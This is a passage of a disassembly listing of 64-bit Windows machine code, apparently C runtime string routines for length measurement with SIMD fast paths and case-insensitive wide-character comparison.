   1400042a3:	4c 0f 42 da          	cmovb  %rdx,%r11
   1400042a7:	49 8d 04 0b          	lea    (%r11,%rcx,1),%rax
   1400042ab:	48 3b c8             	cmp    %rax,%rcx
   1400042ae:	74 0e                	je     0x1400042be
   1400042b0:	41 80 38 00          	cmpb   $0x0,(%r8)
   1400042b4:	74 08                	je     0x1400042be
   1400042b6:	49 ff c0             	inc    %r8
   1400042b9:	4c 3b c0             	cmp    %rax,%r8
   1400042bc:	75 f2                	jne    0x1400042b0
   1400042be:	49 8b d0             	mov    %r8,%rdx
   1400042c1:	49 2b d1             	sub    %r9,%rdx
   1400042c4:	49 3b d3             	cmp    %r11,%rdx
   1400042c7:	0f 85 08 01 00 00    	jne    0x1400043d5
   1400042cd:	49 8b ca             	mov    %r10,%rcx
   1400042d0:	49 8b d0             	mov    %r8,%rdx
   1400042d3:	49 2b cb             	sub    %r11,%rcx
   1400042d6:	4d 8b d8             	mov    %r8,%r11
   1400042d9:	48 8b c1             	mov    %rcx,%rax
   1400042dc:	83 e0 1f             	and    $0x1f,%eax
   1400042df:	4c 2b d8             	sub    %rax,%r11
   1400042e2:	4c 03 d9             	add    %rcx,%r11
   1400042e5:	4d 3b c3             	cmp    %r11,%r8
   1400042e8:	74 1c                	je     0x140004306
   1400042ea:	c5 f1 ef c9          	vpxor  %xmm1,%xmm1,%xmm1
   1400042ee:	c5 f5 74 0a          	vpcmpeqb (%rdx),%ymm1,%ymm1
   1400042f2:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   1400042f6:	85 c0                	test   %eax,%eax
   1400042f8:	c5 f8 77             	vzeroupper
   1400042fb:	75 09                	jne    0x140004306
   1400042fd:	48 83 c2 20          	add    $0x20,%rdx
   140004301:	49 3b d3             	cmp    %r11,%rdx
   140004304:	75 e4                	jne    0x1400042ea
   140004306:	4b 8d 04 11          	lea    (%r9,%r10,1),%rax
   14000430a:	eb 0c                	jmp    0x140004318
   14000430c:	80 3a 00             	cmpb   $0x0,(%rdx)
   14000430f:	0f 84 bd 00 00 00    	je     0x1400043d2
   140004315:	48 ff c2             	inc    %rdx
   140004318:	48 3b d0             	cmp    %rax,%rdx
   14000431b:	75 ef                	jne    0x14000430c
   14000431d:	e9 b0 00 00 00       	jmp    0x1400043d2
   140004322:	83 f8 01             	cmp    $0x1,%eax
   140004325:	0f 8c 8e 00 00 00    	jl     0x1400043b9
   14000432b:	83 e1 0f             	and    $0xf,%ecx
   14000432e:	b8 10 00 00 00       	mov    $0x10,%eax
   140004333:	48 2b c1             	sub    %rcx,%rax
   140004336:	4d 8b c1             	mov    %r9,%r8
   140004339:	48 f7 d9             	neg    %rcx
   14000433c:	4d 1b db             	sbb    %r11,%r11
   14000433f:	4c 23 d8             	and    %rax,%r11
   140004342:	4d 3b d3             	cmp    %r11,%r10
   140004345:	4d 0f 42 da          	cmovb  %r10,%r11
   140004349:	4b 8d 04 0b          	lea    (%r11,%r9,1),%rax
   14000434d:	4c 3b c8             	cmp    %rax,%r9
   140004350:	74 0e                	je     0x140004360
   140004352:	41 80 38 00          	cmpb   $0x0,(%r8)
   140004356:	74 08                	je     0x140004360
   140004358:	49 ff c0             	inc    %r8
   14000435b:	4c 3b c0             	cmp    %rax,%r8
   14000435e:	75 f2                	jne    0x140004352
   140004360:	49 8b d0             	mov    %r8,%rdx
   140004363:	49 2b d1             	sub    %r9,%rdx
   140004366:	49 3b d3             	cmp    %r11,%rdx
   140004369:	75 6a                	jne    0x1400043d5
   14000436b:	49 8b ca             	mov    %r10,%rcx
   14000436e:	49 8b d0             	mov    %r8,%rdx
   140004371:	49 2b cb             	sub    %r11,%rcx
   140004374:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004377:	48 8b c1             	mov    %rcx,%rax
   14000437a:	4d 8b d8             	mov    %r8,%r11
   14000437d:	83 e0 0f             	and    $0xf,%eax
   140004380:	4c 2b d8             	sub    %rax,%r11
   140004383:	4c 03 d9             	add    %rcx,%r11
   140004386:	4d 3b c3             	cmp    %r11,%r8
   140004389:	74 19                	je     0x1400043a4
   14000438b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   14000438f:	66 0f 74 02          	pcmpeqb (%rdx),%xmm0
   140004393:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140004397:	85 c0                	test   %eax,%eax
   140004399:	75 09                	jne    0x1400043a4
   14000439b:	48 83 c2 10          	add    $0x10,%rdx
   14000439f:	49 3b d3             	cmp    %r11,%rdx
   1400043a2:	75 e7                	jne    0x14000438b
   1400043a4:	4b 8d 04 11          	lea    (%r9,%r10,1),%rax
   1400043a8:	eb 08                	jmp    0x1400043b2
   1400043aa:	80 3a 00             	cmpb   $0x0,(%rdx)
   1400043ad:	74 23                	je     0x1400043d2
   1400043af:	48 ff c2             	inc    %rdx
   1400043b2:	48 3b d0             	cmp    %rax,%rdx
   1400043b5:	75 f3                	jne    0x1400043aa
   1400043b7:	eb 19                	jmp    0x1400043d2
   1400043b9:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   1400043bd:	49 8b d1             	mov    %r9,%rdx
   1400043c0:	4c 3b c8             	cmp    %rax,%r9
   1400043c3:	74 0d                	je     0x1400043d2
   1400043c5:	80 3a 00             	cmpb   $0x0,(%rdx)
   1400043c8:	74 08                	je     0x1400043d2
   1400043ca:	48 ff c2             	inc    %rdx
   1400043cd:	48 3b d0             	cmp    %rax,%rdx
   1400043d0:	75 f3                	jne    0x1400043c5
   1400043d2:	49 2b d1             	sub    %r9,%rdx
   1400043d5:	48 8b c2             	mov    %rdx,%rax
   1400043d8:	c3                   	ret
   1400043d9:	cc                   	int3
   1400043da:	cc                   	int3
   1400043db:	cc                   	int3
   1400043dc:	8b 05 ae fb 03 00    	mov    0x3fbae(%rip),%eax        # 0x140043f90
   1400043e2:	4c 8b c1             	mov    %rcx,%r8
   1400043e5:	48 8b d1             	mov    %rcx,%rdx
   1400043e8:	83 f8 05             	cmp    $0x5,%eax
   1400043eb:	0f 8c 82 00 00 00    	jl     0x140004473
   1400043f1:	41 f6 c0 01          	test   $0x1,%r8b
   1400043f5:	74 11                	je     0x140004408
   1400043f7:	33 c9                	xor    %ecx,%ecx
   1400043f9:	66 39 0a             	cmp    %cx,(%rdx)
   1400043fc:	0f 84 f9 00 00 00    	je     0x1400044fb
   140004402:	48 83 c2 02          	add    $0x2,%rdx
   140004406:	eb f1                	jmp    0x1400043f9
   140004408:	83 e1 1f             	and    $0x1f,%ecx
   14000440b:	b8 20 00 00 00       	mov    $0x20,%eax
   140004410:	48 2b c1             	sub    %rcx,%rax
   140004413:	48 f7 d9             	neg    %rcx
   140004416:	4d 1b c9             	sbb    %r9,%r9
   140004419:	33 c9                	xor    %ecx,%ecx
   14000441b:	4c 23 c8             	and    %rax,%r9
   14000441e:	49 d1 e9             	shr    $1,%r9
   140004421:	4b 8d 04 48          	lea    (%r8,%r9,2),%rax
   140004425:	4c 3b c0             	cmp    %rax,%r8
   140004428:	74 0e                	je     0x140004438
   14000442a:	66 39 0a             	cmp    %cx,(%rdx)
   14000442d:	74 09                	je     0x140004438
   14000442f:	48 83 c2 02          	add    $0x2,%rdx
   140004433:	48 3b d0             	cmp    %rax,%rdx
   140004436:	75 f2                	jne    0x14000442a
   140004438:	49 2b d0             	sub    %r8,%rdx
   14000443b:	48 d1 fa             	sar    $1,%rdx
   14000443e:	49 3b d1             	cmp    %r9,%rdx
   140004441:	0f 85 ba 00 00 00    	jne    0x140004501
   140004447:	49 8d 14 50          	lea    (%r8,%rdx,2),%rdx
   14000444b:	c5 e9 ef d2          	vpxor  %xmm2,%xmm2,%xmm2
   14000444f:	c5 ed 75 0a          	vpcmpeqw (%rdx),%ymm2,%ymm1
   140004453:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   140004457:	85 c0                	test   %eax,%eax
   140004459:	75 06                	jne    0x140004461
   14000445b:	48 83 c2 20          	add    $0x20,%rdx
   14000445f:	eb ee                	jmp    0x14000444f
   140004461:	c5 f8 77             	vzeroupper
   140004464:	66 39 0a             	cmp    %cx,(%rdx)
   140004467:	0f 84 8e 00 00 00    	je     0x1400044fb
   14000446d:	48 83 c2 02          	add    $0x2,%rdx
   140004471:	eb f1                	jmp    0x140004464
   140004473:	83 f8 01             	cmp    $0x1,%eax
   140004476:	7c 76                	jl     0x1400044ee
   140004478:	41 f6 c0 01          	test   $0x1,%r8b
   14000447c:	74 0d                	je     0x14000448b
   14000447e:	33 c9                	xor    %ecx,%ecx
   140004480:	66 39 0a             	cmp    %cx,(%rdx)
   140004483:	74 76                	je     0x1400044fb
   140004485:	48 83 c2 02          	add    $0x2,%rdx
   140004489:	eb f5                	jmp    0x140004480
   14000448b:	83 e1 0f             	and    $0xf,%ecx
   14000448e:	b8 10 00 00 00       	mov    $0x10,%eax
   140004493:	48 2b c1             	sub    %rcx,%rax
   140004496:	48 f7 d9             	neg    %rcx
   140004499:	4d 1b c9             	sbb    %r9,%r9
   14000449c:	33 c9                	xor    %ecx,%ecx
   14000449e:	4c 23 c8             	and    %rax,%r9
   1400044a1:	49 d1 e9             	shr    $1,%r9
   1400044a4:	4b 8d 04 48          	lea    (%r8,%r9,2),%rax
   1400044a8:	4c 3b c0             	cmp    %rax,%r8
   1400044ab:	74 0e                	je     0x1400044bb
   1400044ad:	66 39 0a             	cmp    %cx,(%rdx)
   1400044b0:	74 09                	je     0x1400044bb
   1400044b2:	48 83 c2 02          	add    $0x2,%rdx
   1400044b6:	48 3b d0             	cmp    %rax,%rdx
   1400044b9:	75 f2                	jne    0x1400044ad
   1400044bb:	49 2b d0             	sub    %r8,%rdx
   1400044be:	48 d1 fa             	sar    $1,%rdx
   1400044c1:	49 3b d1             	cmp    %r9,%rdx
   1400044c4:	75 3b                	jne    0x140004501
   1400044c6:	49 8d 14 50          	lea    (%r8,%rdx,2),%rdx
   1400044ca:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400044cd:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1400044d1:	66 0f 75 02          	pcmpeqw (%rdx),%xmm0
   1400044d5:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   1400044d9:	85 c0                	test   %eax,%eax
   1400044db:	75 06                	jne    0x1400044e3
   1400044dd:	48 83 c2 10          	add    $0x10,%rdx
   1400044e1:	eb ea                	jmp    0x1400044cd
   1400044e3:	66 39 0a             	cmp    %cx,(%rdx)
   1400044e6:	74 13                	je     0x1400044fb
   1400044e8:	48 83 c2 02          	add    $0x2,%rdx
   1400044ec:	eb f5                	jmp    0x1400044e3
   1400044ee:	33 c9                	xor    %ecx,%ecx
   1400044f0:	66 39 0a             	cmp    %cx,(%rdx)
   1400044f3:	74 06                	je     0x1400044fb
   1400044f5:	48 83 c2 02          	add    $0x2,%rdx
   1400044f9:	eb f5                	jmp    0x1400044f0
   1400044fb:	49 2b d0             	sub    %r8,%rdx
   1400044fe:	48 d1 fa             	sar    $1,%rdx
   140004501:	48 8b c2             	mov    %rdx,%rax
   140004504:	c3                   	ret
   140004505:	cc                   	int3
   140004506:	cc                   	int3
   140004507:	cc                   	int3
   140004508:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000450d:	8b 05 7d fa 03 00    	mov    0x3fa7d(%rip),%eax        # 0x140043f90
   140004513:	4c 8b da             	mov    %rdx,%r11
   140004516:	4c 8b c1             	mov    %rcx,%r8
   140004519:	83 f8 05             	cmp    $0x5,%eax
   14000451c:	0f 8c d5 00 00 00    	jl     0x1400045f7
   140004522:	41 f6 c0 01          	test   $0x1,%r8b
   140004526:	74 2b                	je     0x140004553
   140004528:	48 8d 04 51          	lea    (%rcx,%rdx,2),%rax
   14000452c:	48 8b d1             	mov    %rcx,%rdx
   14000452f:	48 3b c8             	cmp    %rax,%rcx
   140004532:	0f 84 b5 01 00 00    	je     0x1400046ed
   140004538:	45 33 c9             	xor    %r9d,%r9d
   14000453b:	66 44 39 0a          	cmp    %r9w,(%rdx)
   14000453f:	0f 84 a8 01 00 00    	je     0x1400046ed
   140004545:	48 83 c2 02          	add    $0x2,%rdx
   140004549:	48 3b d0             	cmp    %rax,%rdx
   14000454c:	75 ed                	jne    0x14000453b
   14000454e:	e9 9a 01 00 00       	jmp    0x1400046ed
   140004553:	83 e1 1f             	and    $0x1f,%ecx
   140004556:	b8 20 00 00 00       	mov    $0x20,%eax
   14000455b:	48 2b c1             	sub    %rcx,%rax
   14000455e:	49 8b d0             	mov    %r8,%rdx
   140004561:	48 f7 d9             	neg    %rcx
   140004564:	48 1b db             	sbb    %rbx,%rbx
   140004567:	48 23 d8             	and    %rax,%rbx
   14000456a:	48 d1 eb             	shr    $1,%rbx
   14000456d:	4c 3b db             	cmp    %rbx,%r11
   140004570:	49 0f 42 db          	cmovb  %r11,%rbx
   140004574:	45 33 c9             	xor    %r9d,%r9d
   140004577:	49 8d 04 58          	lea    (%r8,%rbx,2),%rax
   14000457b:	4c 3b c0             	cmp    %rax,%r8
   14000457e:	74 0f                	je     0x14000458f
   140004580:	66 44 39 0a          	cmp    %r9w,(%rdx)
   140004584:	74 09                	je     0x14000458f
   140004586:	48 83 c2 02          	add    $0x2,%rdx
   14000458a:	48 3b d0             	cmp    %rax,%rdx
   14000458d:	75 f1                	jne    0x140004580
   14000458f:	49 2b d0             	sub    %r8,%rdx
   140004592:	48 d1 fa             	sar    $1,%rdx
   140004595:	48 3b d3             	cmp    %rbx,%rdx
   140004598:	0f 85 55 01 00 00    	jne    0x1400046f3
   14000459e:	4d 8d 14 50          	lea    (%r8,%rdx,2),%r10
   1400045a2:	49 8b cb             	mov    %r11,%rcx
   1400045a5:	48 2b cb             	sub    %rbx,%rcx
   1400045a8:	48 8b c1             	mov    %rcx,%rax
   1400045ab:	83 e0 1f             	and    $0x1f,%eax
   1400045ae:	48 2b c8             	sub    %rax,%rcx
   1400045b1:	48 03 ca             	add    %rdx,%rcx
   1400045b4:	49 8d 14 48          	lea    (%r8,%rcx,2),%rdx
   1400045b8:	4c 3b d2             	cmp    %rdx,%r10
   1400045bb:	74 1d                	je     0x1400045da
   1400045bd:	c5 f1 ef c9          	vpxor  %xmm1,%xmm1,%xmm1
   1400045c1:	c4 c1 75 75 0a       	vpcmpeqw (%r10),%ymm1,%ymm1
   1400045c6:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   1400045ca:	85 c0                	test   %eax,%eax
   1400045cc:	c5 f8 77             	vzeroupper
   1400045cf:	75 09                	jne    0x1400045da
   1400045d1:	49 83 c2 20          	add    $0x20,%r10
   1400045d5:	4c 3b d2             	cmp    %rdx,%r10
   1400045d8:	75 e3                	jne    0x1400045bd
   1400045da:	4b 8d 04 58          	lea    (%r8,%r11,2),%rax
   1400045de:	eb 0a                	jmp    0x1400045ea
   1400045e0:	66 45 39 0a          	cmp    %r9w,(%r10)
   1400045e4:	74 09                	je     0x1400045ef
   1400045e6:	49 83 c2 02          	add    $0x2,%r10
   1400045ea:	4c 3b d0             	cmp    %rax,%r10
   1400045ed:	75 f1                	jne    0x1400045e0
   1400045ef:	49 8b d2             	mov    %r10,%rdx
   1400045f2:	e9 f6 00 00 00       	jmp    0x1400046ed
   1400045f7:	83 f8 01             	cmp    $0x1,%eax
   1400045fa:	0f 8c cf 00 00 00    	jl     0x1400046cf
   140004600:	41 f6 c0 01          	test   $0x1,%r8b
   140004604:	74 2b                	je     0x140004631
   140004606:	48 8d 04 51          	lea    (%rcx,%rdx,2),%rax
   14000460a:	49 8b d0             	mov    %r8,%rdx
   14000460d:	4c 3b c0             	cmp    %rax,%r8
   140004610:	0f 84 d7 00 00 00    	je     0x1400046ed
   140004616:	45 33 c9             	xor    %r9d,%r9d
   140004619:	66 44 39 0a          	cmp    %r9w,(%rdx)
   14000461d:	0f 84 ca 00 00 00    	je     0x1400046ed
   140004623:	48 83 c2 02          	add    $0x2,%rdx
   140004627:	48 3b d0             	cmp    %rax,%rdx
   14000462a:	75 ed                	jne    0x140004619
   14000462c:	e9 bc 00 00 00       	jmp    0x1400046ed
   140004631:	83 e1 0f             	and    $0xf,%ecx
   140004634:	b8 10 00 00 00       	mov    $0x10,%eax
   140004639:	48 2b c1             	sub    %rcx,%rax
   14000463c:	49 8b d0             	mov    %r8,%rdx
   14000463f:	48 f7 d9             	neg    %rcx
   140004642:	48 1b db             	sbb    %rbx,%rbx
   140004645:	48 23 d8             	and    %rax,%rbx
   140004648:	48 d1 eb             	shr    $1,%rbx
   14000464b:	4c 3b db             	cmp    %rbx,%r11
   14000464e:	49 0f 42 db          	cmovb  %r11,%rbx
   140004652:	45 33 c9             	xor    %r9d,%r9d
   140004655:	49 8d 04 58          	lea    (%r8,%rbx,2),%rax
   140004659:	4c 3b c0             	cmp    %rax,%r8
   14000465c:	74 0f                	je     0x14000466d
   14000465e:	66 44 39 0a          	cmp    %r9w,(%rdx)
   140004662:	74 09                	je     0x14000466d
   140004664:	48 83 c2 02          	add    $0x2,%rdx
   140004668:	48 3b d0             	cmp    %rax,%rdx
   14000466b:	75 f1                	jne    0x14000465e
   14000466d:	49 2b d0             	sub    %r8,%rdx
   140004670:	48 d1 fa             	sar    $1,%rdx
   140004673:	48 3b d3             	cmp    %rbx,%rdx
   140004676:	75 7b                	jne    0x1400046f3
   140004678:	49 8b cb             	mov    %r11,%rcx
   14000467b:	4d 8d 14 50          	lea    (%r8,%rdx,2),%r10
   14000467f:	48 2b cb             	sub    %rbx,%rcx
   140004682:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004685:	48 8b c1             	mov    %rcx,%rax
   140004688:	83 e0 0f             	and    $0xf,%eax
   14000468b:	48 2b c8             	sub    %rax,%rcx
   14000468e:	48 03 ca             	add    %rdx,%rcx
   140004691:	49 8d 14 48          	lea    (%r8,%rcx,2),%rdx
   140004695:	eb 15                	jmp    0x1400046ac
   140004697:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   14000469b:	66 41 0f 75 02       	pcmpeqw (%r10),%xmm0
   1400046a0:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   1400046a4:	85 c0                	test   %eax,%eax
   1400046a6:	75 09                	jne    0x1400046b1
   1400046a8:	49 83 c2 10          	add    $0x10,%r10
   1400046ac:	4c 3b d2             	cmp    %rdx,%r10
   1400046af:	75 e6                	jne    0x140004697
   1400046b1:	4b 8d 04 58          	lea    (%r8,%r11,2),%rax
   1400046b5:	eb 0e                	jmp    0x1400046c5
   1400046b7:	66 45 39 0a          	cmp    %r9w,(%r10)
   1400046bb:	0f 84 2e ff ff ff    	je     0x1400045ef
   1400046c1:	49 83 c2 02          	add    $0x2,%r10
   1400046c5:	4c 3b d0             	cmp    %rax,%r10
   1400046c8:	75 ed                	jne    0x1400046b7
   1400046ca:	e9 20 ff ff ff       	jmp    0x1400045ef
   1400046cf:	48 8d 04 51          	lea    (%rcx,%rdx,2),%rax
   1400046d3:	49 8b d0             	mov    %r8,%rdx
   1400046d6:	4c 3b c0             	cmp    %rax,%r8
   1400046d9:	74 12                	je     0x1400046ed
   1400046db:	45 33 c9             	xor    %r9d,%r9d
   1400046de:	66 44 39 0a          	cmp    %r9w,(%rdx)
   1400046e2:	74 09                	je     0x1400046ed
   1400046e4:	48 83 c2 02          	add    $0x2,%rdx
   1400046e8:	48 3b d0             	cmp    %rax,%rdx
   1400046eb:	75 f1                	jne    0x1400046de
   1400046ed:	49 2b d0             	sub    %r8,%rdx
   1400046f0:	48 d1 fa             	sar    $1,%rdx
   1400046f3:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400046f8:	48 8b c2             	mov    %rdx,%rax
   1400046fb:	c3                   	ret
   1400046fc:	4c 8b da             	mov    %rdx,%r11
   1400046ff:	4c 8b d1             	mov    %rcx,%r10
   140004702:	4d 85 c0             	test   %r8,%r8
   140004705:	75 03                	jne    0x14000470a
   140004707:	33 c0                	xor    %eax,%eax
   140004709:	c3                   	ret
   14000470a:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000470e:	4d 8d 52 02          	lea    0x2(%r10),%r10
   140004712:	41 0f b7 13          	movzwl (%r11),%edx
   140004716:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000471a:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000471d:	83 f8 19             	cmp    $0x19,%eax
   140004720:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   140004724:	8d 42 bf             	lea    -0x41(%rdx),%eax
   140004727:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000472b:	83 f8 19             	cmp    $0x19,%eax
   14000472e:	8d 4a 20             	lea    0x20(%rdx),%ecx
   140004731:	41 8b c1             	mov    %r9d,%eax
   140004734:	0f 47 ca             	cmova  %edx,%ecx
   140004737:	2b c1                	sub    %ecx,%eax
   140004739:	75 0b                	jne    0x140004746
   14000473b:	45 85 c9             	test   %r9d,%r9d
   14000473e:	74 06                	je     0x140004746
   140004740:	49 83 e8 01          	sub    $0x1,%r8
   140004744:	75 c4                	jne    0x14000470a
   140004746:	c3                   	ret
   140004747:	cc                   	int3
   140004748:	48 83 ec 28          	sub    $0x28,%rsp
   14000474c:	83 3d 35 fb 03 00 00 	cmpl   $0x0,0x3fb35(%rip)        # 0x140044288
   140004753:	75 2d                	jne    0x140004782
   140004755:	48 85 c9             	test   %rcx,%rcx
   140004758:	75 1a                	jne    0x140004774
   14000475a:	e8 c5 07 00 00       	call   0x140004f24
   14000475f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004765:	e8 66 05 00 00       	call   0x140004cd0
   14000476a:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000476f:	48 83 c4 28          	add    $0x28,%rsp
   140004773:	c3                   	ret
   140004774:	48 85 d2             	test   %rdx,%rdx
   140004777:	74 e1                	je     0x14000475a
   140004779:	48 83 c4 28          	add    $0x28,%rsp
   14000477d:	e9 7a ff ff ff       	jmp    0x1400046fc
   140004782:	45 33 c9             	xor    %r9d,%r9d
   140004785:	48 83 c4 28          	add    $0x28,%rsp
   140004789:	e9 02 00 00 00       	jmp    0x140004790
   14000478e:	cc                   	int3
   14000478f:	cc                   	int3
   140004790:	48 8b c4             	mov    %rsp,%rax
   140004793:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004797:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000479b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000479f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400047a3:	41 54                	push   %r12
   1400047a5:	41 56                	push   %r14
   1400047a7:	41 57                	push   %r15
   1400047a9:	48 83 ec 40          	sub    $0x40,%rsp
   1400047ad:	49 8b e8             	mov    %r8,%rbp
   1400047b0:	48 8b f2             	mov    %rdx,%rsi
   1400047b3:	48 8b d9             	mov    %rcx,%rbx
   1400047b6:	48 85 c9             	test   %rcx,%rcx
   1400047b9:	75 1a                	jne    0x1400047d5
   1400047bb:	e8 64 07 00 00       	call   0x140004f24
   1400047c0:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400047c6:	e8 05 05 00 00       	call   0x140004cd0
   1400047cb:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400047d0:	e9 ed 00 00 00       	jmp    0x1400048c2
   1400047d5:	48 85 f6             	test   %rsi,%rsi
   1400047d8:	74 e1                	je     0x1400047bb
   1400047da:	48 85 ed             	test   %rbp,%rbp
   1400047dd:	75 07                	jne    0x1400047e6
   1400047df:	33 c0                	xor    %eax,%eax
   1400047e1:	e9 dc 00 00 00       	jmp    0x1400048c2
   1400047e6:	49 8b d1             	mov    %r9,%rdx
   1400047e9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047ee:	e8 1d f8 ff ff       	call   0x140004010
   1400047f3:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400047f8:	48 83 ba 38 01 00 00 	cmpq   $0x0,0x138(%rdx)
   1400047ff:	00 
   140004800:	75 15                	jne    0x140004817
   140004802:	4c 8b c5             	mov    %rbp,%r8
   140004805:	48 8b d6             	mov    %rsi,%rdx
   140004808:	48 8b cb             	mov    %rbx,%rcx
   14000480b:	e8 ec fe ff ff       	call   0x1400046fc
   140004810:	8b f8                	mov    %eax,%edi
   140004812:	e9 96 00 00 00       	jmp    0x1400048ad
   140004817:	41 bf 00 01 00 00    	mov    $0x100,%r15d
   14000481d:	4c 8d 25 0c 23 03 00 	lea    0x3230c(%rip),%r12        # 0x140036b30
   140004824:	0f b7 0b             	movzwl (%rbx),%ecx
   140004827:	48 8d 5b 02          	lea    0x2(%rbx),%rbx
   14000482b:	66 41 3b cf          	cmp    %r15w,%cx
   14000482f:	73 1a                	jae    0x14000484b
   140004831:	0f b6 c9             	movzbl %cl,%ecx
   140004834:	41 f6 44 4c 02 01    	testb  $0x1,0x2(%r12,%rcx,2)
   14000483a:	74 0a                	je     0x140004846
   14000483c:	48 8b 82 10 01 00 00 	mov    0x110(%rdx),%rax
   140004843:	8a 0c 01             	mov    (%rcx,%rax,1),%cl
   140004846:	0f b6 c1             	movzbl %cl,%eax
   140004849:	eb 0f                	jmp    0x14000485a
   14000484b:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140004850:	e8 13 05 00 00       	call   0x140004d68
   140004855:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   14000485a:	0f b7 0e             	movzwl (%rsi),%ecx
   14000485d:	48 83 c6 02          	add    $0x2,%rsi
   140004861:	44 0f b7 f0          	movzwl %ax,%r14d
   140004865:	41 8b fe             	mov    %r14d,%edi
   140004868:	66 41 3b cf          	cmp    %r15w,%cx
   14000486c:	73 1a                	jae    0x140004888
   14000486e:	0f b6 c9             	movzbl %cl,%ecx
   140004871:	41 f6 44 4c 02 01    	testb  $0x1,0x2(%r12,%rcx,2)
   140004877:	74 0a                	je     0x140004883
   140004879:	48 8b 82 10 01 00 00 	mov    0x110(%rdx),%rax
   140004880:	8a 0c 01             	mov    (%rcx,%rax,1),%cl
   140004883:	0f b6 c1             	movzbl %cl,%eax
   140004886:	eb 0f                	jmp    0x140004897
   140004888:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000488d:	e8 d6 04 00 00       	call   0x140004d68
   140004892:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140004897:	0f b7 c0             	movzwl %ax,%eax
   14000489a:	2b f8                	sub    %eax,%edi
   14000489c:	75 0f                	jne    0x1400048ad
   14000489e:	45 85 f6             	test   %r14d,%r14d
   1400048a1:	74 0a                	je     0x1400048ad
   1400048a3:	48 83 ed 01          	sub    $0x1,%rbp
   1400048a7:	0f 85 77 ff ff ff    	jne    0x140004824
   1400048ad:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400048b2:	74 0c                	je     0x1400048c0
   1400048b4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400048b9:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400048c0:	8b c7                	mov    %edi,%eax
   1400048c2:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400048c7:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   1400048cc:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1400048d1:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400048d6:	48 83 c4 40          	add    $0x40,%rsp
   1400048da:	41 5f                	pop    %r15
   1400048dc:	41 5e                	pop    %r14
   1400048de:	41 5c                	pop    %r12
   1400048e0:	c3                   	ret
   1400048e1:	cc                   	int3
   1400048e2:	cc                   	int3
   1400048e3:	cc                   	int3
   1400048e4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400048e9:	57                   	push   %rdi
   1400048ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400048ee:	48 83 39 00          	cmpq   $0x0,(%rcx)
   1400048f2:	48 8b f9             	mov    %rcx,%rdi
   1400048f5:	75 40                	jne    0x140004937
   1400048f7:	ff 15 bb 0d 03 00    	call   *0x30dbb(%rip)        # 0x1400356b8
   1400048fd:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   140004901:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140004905:	75 0d                	jne    0x140004914
   140004907:	48 83 67 08 00       	andq   $0x0,0x8(%rdi)
   14000490c:	33 d2                	xor    %edx,%edx
   14000490e:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   140004912:	eb 04                	jmp    0x140004918
   140004914:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140004918:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000491d:	e8 0e 0c 00 00       	call   0x140005530
   140004922:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140004926:	48 8b d8             	mov    %rax,%rbx
   140004929:	48 89 07             	mov    %rax,(%rdi)
   14000492c:	ff 15 8e 0d 03 00    	call   *0x30d8e(%rip)        # 0x1400356c0
   140004932:	48 85 db             	test   %rbx,%rbx
   140004935:	74 0e                	je     0x140004945
   140004937:	48 8b 07             	mov    (%rdi),%rax
   14000493a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000493f:	48 83 c4 20          	add    $0x20,%rsp
   140004943:	5f                   	pop    %rdi
   140004944:	c3                   	ret
   140004945:	e8 32 0f 00 00       	call   0x14000587c
   14000494a:	cc                   	int3
   14000494b:	cc                   	int3
   14000494c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004951:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004956:	57                   	push   %rdi
   140004957:	48 83 ec 20          	sub    $0x20,%rsp
   14000495b:	48 8b 31             	mov    (%rcx),%rsi
   14000495e:	33 ff                	xor    %edi,%edi
   140004960:	48 8b d9             	mov    %rcx,%rbx
   140004963:	48 85 f6             	test   %rsi,%rsi
